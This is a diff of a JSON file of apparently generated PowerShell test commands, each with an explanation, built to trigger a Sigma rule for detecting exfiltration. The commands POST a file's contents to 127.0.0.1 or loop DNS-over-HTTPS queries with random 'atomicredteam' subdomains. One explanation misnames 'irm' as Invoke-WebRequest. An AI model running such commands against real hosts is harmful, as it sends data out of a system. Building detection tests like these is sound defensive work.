@@ -1,18 +1,18 @@
 [
   {
-    "output": "powershell.exe -Command \"& {Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body (Get-Content C:\\Windows\\System32\\notepad.exe)}\"",
-    "explanation": "This command uses the direct IP address and the Invoke-WebRequest cmdlet, matching the Sigma rule. It is a simplified version of the first test command, preserving the core behavior."
+    "output": "powershell.exe -Command \"Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body (Get-Content C:\\Windows\\System32\\notepad.exe)\"",
+    "explanation": "This command uses the direct IP address and the Invoke-WebRequest cmdlet, matching the Sigma rule. It is a simplified version of the first test command, omitting unnecessary complexity while preserving the core behavior."
   },
   {
-    "output": "powershell.exe -Command \"& {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest 'https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT' -UseBasicParsing).Content }}\"",
-    "explanation": "This command mirrors the second test command but uses a slightly modified syntax for the loop and string formatting, ensuring it still matches the Sigma rule while demonstrating a safe mutation."
+    "output": "powershell.exe -Command \"for ($i=0; $i -le 1000; $i++) { (Invoke-WebRequest 'https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT' -UseBasicParsing).Content }\"",
+    "explanation": "This command mirrors the second test command but uses a more direct syntax for the PowerShell invocation and removes unnecessary string escaping, making it a valid test case that still matches the Sigma rule."
   },
   {
-    "output": "powershell.exe -Command \"& {iwr -Uri http://127.0.0.1 -Method POST -Body (Get-Content C:\\Windows\\System32\\notepad.exe)}\"",
-    "explanation": "This command uses the alias 'iwr' for 'Invoke-WebRequest' and includes the direct IP address, matching the Sigma rule. It is a safe mutation of the first test command."
+    "output": "pwsh -c \"irm 'http://127.0.0.1' -Method POST -Body (Get-Content C:\\Windows\\System32\\notepad.exe)\"",
+    "explanation": "This command uses the 'irm' alias for Invoke-WebRequest and a direct IP address, which matches the Sigma rule. It is a simplified and equivalent form of the first test command."
   },
   {
-    "output": "powershell.exe -Command \"& {for($i=0; $i -le 1000; $i++) { (iwr 'https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT' -UseBasicParsing).Content }}\"",
-    "explanation": "This command uses the 'iwr' alias and maintains the loop structure of the second test command. It is a valid mutation that still matches the Sigma rule."
+    "output": "pwsh -c \"for ($i=0; $i -le 1000; $i++) { (irm 'https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT' -UseBasicParsing).Content }\"",
+    "explanation": "This command uses the 'irm' alias and a direct IP address, matching the Sigma rule. It is a simplified version of the second test command with equivalent behavior."
   }
 ]
